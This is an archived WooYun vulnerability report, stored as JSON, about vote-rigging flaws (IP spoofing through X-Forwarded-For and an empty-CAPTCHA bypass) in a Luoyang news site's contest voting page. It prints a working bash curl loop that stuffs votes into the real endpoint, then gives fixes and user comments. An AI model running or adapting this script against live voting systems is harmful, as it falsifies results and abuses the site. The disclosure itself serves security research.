{"id": 21172, "wybug_id": "wooyun-2012-05285", "wybug_title": "2012洛阳首届胸模大赛投票系统刷票漏洞", "wybug_corp": "洛阳网 http://www2.lyd.com.cn:8080/", "wybug_author": "mckelvin", "wybug_date": "2012-03-15 21:21", "wybug_open_date": "2012-03-15 21:21", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "低", "wybug_rank_0": "4", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-03-15：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-03-15：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 存在IP绕过漏洞存在验证码绕过漏洞 详细说明：  \n#!/bin/bash# author @十三乙# vote for http://weibo.com/1680241201/y9ZarqaHo# http://www2.lyd.com.cn:8080/ph.aspREFERER=\"http://www2.lyd.com.cn:8080/ph.asp\";USER_AGENT=\"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.79 Safari/535.11\";while true;do\tFAKEIP=\"$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255))\"\tcurl -X POST -H \"X-Forwarded-For:$FAKEIP\" -H \"Referer:$REFERER\" -H \"UserAgent:$USER_AGENT\" -d \"toupiao_id=24&votecode=&x=79&y=38\" \"http://www2.lyd.com.cn:8080/tp_sub.asp\"done\n   漏洞证明：  @李铁根 ： 越是身处喧嚣迷乱的尘世，越要坚持真实的自己。在这个去伪存真的日子，伸出你有爱的双手，帮忙在洛阳首届胸模大赛中投康艳艳一票吧。http://t.cn/zOMyhTb\n\n\n\n\n#!/bin/bash# author @十三乙# vote for http://weibo.com/1680241201/y9ZarqaHo# http://www2.lyd.com.cn:8080/ph.aspREFERER=\"http://www2.lyd.com.cn:8080/ph.asp\";USER_AGENT=\"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.79 Safari/535.11\";while true;do\tFAKEIP=\"$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255))\"\tcurl -X POST -H \"X-Forwarded-For:$FAKEIP\" -H \"Referer:$REFERER\" -H \"UserAgent:$USER_AGENT\" -d \"toupiao_id=24&votecode=&x=79&y=38\" \"http://www2.lyd.com.cn:8080/tp_sub.asp\"done\n   修复方案：  验证码绕过：初始化session中的验证码、处理post请求时判断验证码是否为空。IP绕过：综合RemoteAddress和XFF判断是否重复投票。可参考： 浅谈新形势下在线Web投票系统的攻防(1)/(2)    × http://blog.mckelv.in/articles/1114.html   版权声明：转载请注明来源 mckelvin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2012-03-15 21:43 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  胸弟,洞主,你也找个长得对得起观众撒、    \n     2012-03-15 22:33 |    \t\t无敌L.t.H \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | ‮……肉肉捉活，亭长放解)\t\t \n  还是顶上去害人吧    \n     2012-03-15 23:10 |    \t\tEnjoy_Hacking \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:8        | 时间无言，如此这般。)\t\t \n  LZ赔我狗眼    \n     2012-03-15 23:34 |    \t\tpangshenjie \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:14        )\t\t \n  亮瞎了    \n     2012-03-16 01:06 |    \t\tRookie \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:78        | 123)\t\t \n  差点蓝屏..    \n     2012-03-16 01:52 |    \t\tZ-0ne  \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:38        | 目前专注于工控安全基础研究，工业数据采集...)\t\t \n  @mckelvin 洞主，我看好你，你太强了    \n     2012-03-16 10:12 |    \t\t瓜瓜 \t\t\t( 普通白帽子  |\t\t\t        Rank:173 漏洞数:25        )\t\t \n  洞主....你厉害    \n     2012-03-16 10:45 |    \t\tgoderci \t\t\t( 普通白帽子  |\t\t\t        Rank:542 漏洞数:47        | http://www.yunday.org)\t\t \n  LZ是这胸魔的托？    \n     2012-03-16 14:33 |    \t\tAdmin 17951 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:4        | www.wooyun.org)\t\t \n  @goderci LZ重口味啊！    \n     2012-03-16 15:18 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  我的钛合金    \n     2012-03-16 19:42 |    \t\tpopok \t\t\t( 普通白帽子  |\t\t\t        Rank:117 漏洞数:24        | nothing)\t\t \n  嘿嘿，找到一个校友看了下貌似和我兴趣很像啊，求搞基！    \n     2012-03-20 18:36 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  缺陷关联： WooYun: 腾讯微博投票任意刷票    \n     2012-03-20 18:41 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  缺陷关联：（2） WooYun: 网易英雄贴可刷票    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}